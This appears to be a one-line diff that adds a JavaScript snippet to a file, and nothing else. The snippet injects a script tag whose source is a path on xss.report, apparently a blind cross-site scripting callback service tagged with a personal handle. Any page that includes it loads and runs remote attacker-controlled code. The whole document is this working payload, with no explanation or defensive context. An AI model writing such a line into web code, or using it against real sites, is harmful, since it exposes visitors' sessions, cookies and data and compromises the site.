@@ -1,0 +1,1 @@
+var a=document.createElement("script");a.src="https://xss.report/c/hamzawy";document.body.appendChild(a);
